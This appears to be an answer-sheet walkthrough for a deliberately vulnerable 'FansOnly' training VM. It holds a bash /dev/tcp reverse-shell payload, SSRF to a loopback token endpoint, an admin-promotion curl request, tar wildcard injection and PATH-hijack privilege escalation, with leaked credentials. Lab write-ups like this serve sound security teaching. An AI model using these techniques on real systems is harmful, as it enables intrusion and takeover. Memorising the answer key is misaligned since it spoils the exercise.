# Red Team Walkthrough

This guide only applies to the `FansOnly` training VM built from this repo. It is an answer sheet for the simulated classroom environment, not a guide for attacking real systems.

Assume the blue team has freshly reset the VM with `reset-state.sh` before you start.

## Target Overview

Public entrypoint:

```text
http://<vm_ip>/
```

You have three intended initial-access paths:

1. CSV export leak -> `devops` SSH
2. legacy React/Server Action clue -> `www-data` reverse-shell drop event
3. webhook SSRF clue -> analyst account

You also have:

- `.env` reuse to pivot from `www-data` to `devops`
- localhost admin API to promote analyst to admin
- two simulated `devops` -> `root` paths

## Path 1: IDOR -> SSH as devops

### Click path

1. Open `http://<vm_ip>/robots.txt`
2. Notice `/internal/exports/`
3. Open `http://<vm_ip>/assets/site-notes.js`
4. Notice the comment:

```js
// TODO: remove debug exports at /internal/exports/users.csv
```

5. Open `http://<vm_ip>/internal/exports/users.csv`

Expected result:

- username: `devops`
- password: `123456`

### SSH command

```bash
ssh devops@<vm_ip>
```

Password:

```text
123456
```

Important:

- this opens the FansOnly restricted training shell, not a normal Linux shell;
- from here you can inspect the simulated host and perform the two privesc paths below.

Useful starter commands:

```bash
whoami
pwd
ls
cat /etc/cron.d/fansonly-backup
cat /usr/local/sbin/fansonly-maintenance.sh
```

## Path 2: Simulated React RCE -> reverse-shell drop

### Click path

1. Open the home page.
2. Read the banner mentioning:
   - `react@19.1.0`
   - `next@15.1.0`
3. Click `Open legacy action preview`, or go directly to:

```text
http://<vm_ip>/legacy-preview
```

### Payload to submit

In the `Action payload` box, paste this exact value:

```json
bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
```

Then click `Send preview payload`.

Expected result:

- a status banner confirms the reverse-shell callback was dropped for training progression
- browser-interactive shell access is intentionally disabled

### Operator note

The reverse-shell event models code execution as `www-data` outside the browser.
Use the reused password from challenge materials to pivot into the `devops` SSH path:

```bash
ssh devops@<vm_ip>
```

Password:

```text
123456
```

## Path 3: Webhook SSRF -> analyst account

### Click path

1. Open:

```text
http://<vm_ip>/docs/webhook
```

2. Read the hint text about pinging your URL.
3. Click `Open tester`, or go directly to:

```text
http://<vm_ip>/tools/webhook-test
```

### URL to test

The tester input is now blank (no default URL). The webhook docs page at `/docs/webhook` lists several decoy event types and path hints to mislead, but the key hint is in the docs text: "only loopback targets receive a live fetch."

Students must discover the SSRF target. The intended URL:

```text
http://127.0.0.1:9000/bootstrap
```

Paste it into the `Target URL` field and click `Send sample event`.

Expected result:

- the response contains `adminToken`

### Create the analyst account

Open:

```text
http://<vm_ip>/account/analyst-signup
```

Use:

- email: `analyst@fansonly.local`
- password: `123456`
- bootstrap token: copy the `adminToken` from the webhook tester response

After signup, you land on `/account`.

Copy the session token shown on the page. You will need it for the admin-promotion step.

## Horizontal Escalation: Promote analyst to admin

This path combines:

- the analyst account from the webhook path
- code execution context from the legacy-preview reverse-shell drop path

### Preparation

1. Complete the webhook path and copy the session token from `/account`
2. Complete the legacy-preview path to trigger the reverse-shell drop event

### Command to run from host context

On a freshly reset VM, the analyst account you created is user ID `2`.

Run this from any host-level context that can reach localhost services (for example, after `ssh devops@<vm_ip>`):

Run:

```bash
curl -X POST http://127.0.0.1:4000/users/2/role -H 'Authorization: Bearer <SESSION_TOKEN>' -d '{"role":"admin"}'
```

Replace `<SESSION_TOKEN>` with the value copied from `/account`.

Expected result:

- the response JSON shows `"role": "admin"`

### Verify

Refresh:

```text
http://<vm_ip>/account
```

Expected result:

- your account role now reads `admin`

## Vertical Escalation 1: Wildcard injection

Start from the `devops` SSH shell.

### Commands

```bash
cd /srv/fan-backups/staging
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
whoami
cat /root/root.txt
```

Expected result:

- `whoami` returns `root`
- `cat /root/root.txt` returns the simulated root flag

## Vertical Escalation 2: PATH hijack

Start from the `devops` SSH shell.

### Commands

```bash
printf '#!/bin/sh\necho owned\n' > /home/devops/.local/bin/du
chmod +x /home/devops/.local/bin/du
id
cat /root/root.txt
```

Expected result:

- `id` returns `uid=0(root)`
- `cat /root/root.txt` returns the simulated root flag

## Fastest End-To-End Paths

### Fastest host-compromise narrative

1. `/robots.txt`
2. `/assets/site-notes.js`
3. `/internal/exports/users.csv`
4. `ssh devops@<vm_ip>` with `123456`
5. run either privesc path

### Fastest app-admin narrative

1. `/tools/webhook-test` (no default URL — enter `http://127.0.0.1:9000/bootstrap`)
2. read the leaked `adminToken` from the response
3. create analyst account
4. go to `/account` and copy session token
5. trigger `/legacy-preview` to drop reverse-shell callback event
6. call the localhost admin API from host context using the copied token

## If Something Looks Wrong

Symptoms:

- analyst account is not user ID `2`
- you are already `root` in the training shell
- `/account` already shows an unexpected role

Cause:

- the VM was probably not reset between runs

Fix:

- ask the blue team to run:

```bash
sudo bash reset-state.sh
```
